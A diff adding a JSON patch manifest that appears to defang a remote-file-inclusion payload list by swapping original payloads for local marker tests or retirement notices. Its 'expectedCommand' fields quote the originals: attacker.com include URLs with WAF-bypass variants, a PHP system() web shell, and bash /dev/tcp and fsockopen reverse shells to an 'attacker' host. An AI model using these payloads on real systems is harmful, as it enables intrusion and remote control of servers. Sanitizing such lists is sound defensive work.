@@ -1,0 +1,52 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "rfi-basic",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "?file=http://attacker.com/shell.txt\n?file=http://attacker.com/shell.txt%00\n?file=http://attacker.com/shell.txt?",
+          "command": "?file=http://127.0.0.1:18080/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# shell.txt内容\n<?php system($_GET['cmd']); ?>\n\n# 访问\n?file=http://attacker.com/shell.txt&cmd=id",
+          "command": "work_dir=$(mktemp -d)\nprintf '%s\\n' 'PAYLOADER_MARKER' > \"$work_dir/PAYLOADER_MARKER.txt\"\npython3 -m http.server 18080 --bind 127.0.0.1 --directory \"$work_dir\" > \"$work_dir/server.log\" 2>&1 &\nserver_pid=$!\ntrap 'kill \"$server_pid\" 2>/dev/null; rm -rf \"$work_dir\"' EXIT\ncurl --fail --silent --show-error --max-time 3 http://127.0.0.1:18080/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# shell.txt内容\n<?php system(\"bash -c \\\"bash -i >& /dev/tcp/attacker/4444 0>&1\\\"\"); ?>\n\n# 或使用\n<?php $sock=fsockopen(\"attacker\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
+          "command": "printf '%s\\n' 'retired=rfi-command-execution reason=side-effecting-content-removed'"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+          "command": "?file=data://text/plain,PAYLOADER_MARKER\n?file=data://text/plain;base64,UEFZTE9BREVSX01BUktFUg=="
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "?file=htthttp://p://attacker.com/shell.txt\n?file=http://attackerattacker.com.com/shell.txt",
+          "command": "printf '%s\\n' 'retired=rfi-double-write reason=invalid-url-construction'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "?file=HtTp://attacker.com/shell.txt\n?file=HTTP://attacker.com/shell.txt",
+          "command": "?file=HtTp://127.0.0.1:18080/PAYLOADER_MARKER.txt\n?file=HTTP://127.0.0.1:18080/PAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "?file=ftp://attacker.com/shell.txt\n?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt",
+          "command": "printf '%s\\n' 'retired=rfi-mixed-protocols reason=separate-protocol-preconditions-required'"
+        }
+      ]
+    }
+  ]
+}
